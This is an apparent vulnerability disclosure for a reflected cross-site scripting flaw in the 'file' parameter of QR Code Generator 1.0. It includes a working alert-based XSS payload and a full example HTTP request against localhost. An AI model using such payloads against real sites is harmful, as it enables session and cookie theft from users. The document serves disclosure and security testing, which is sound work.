# QR_Code_Generator-Reflected_Cross_Site_Scripting
+ **Exploit Title:** QR_Code_Generator-Reflected_Cross_Site_Scripting
+ **Date:** 2023-27-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/qr-code-generator-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/QR_CODE_GENERATOR_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-

## References: 

## Description:
QR Code Generator 1.0 allows Reflected Cross-site Scripting via parameter 'file' in "/qr-codegen/download.php?file=author.png". QR Code Generator is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Copy the link address of "Download QR Code": "http://localhost/qr-codegen/download.php?file=author.png"
+ And navigate to `http://localhost/qr-codegen/download.php?file=author.png"><iMg src=N onerror=alert(document.domain)>`
+ Use this payload: `"><iMg src=N onerror=alert(document.domain)>`
+ The XSS will be triggered.
+ Alerts will pop-up.
+ Example request for 'file' parameter:
```
GET /qr-codegen/download.php?file=author.png"><iMg src=N onerror=alert(document.domain)> HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Referer: http://localhost/qr-codegen/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
```

![1](https://github.com/h4md153v63n/CVEs/assets/5091265/6f94b7e5-6ca1-4818-9a32-9bd990afa2ef)
<br>
<br>
<br>
![1-2](https://github.com/h4md153v63n/CVEs/assets/5091265/c9a8d093-c58a-4e6c-a848-92cfc4672ca8)
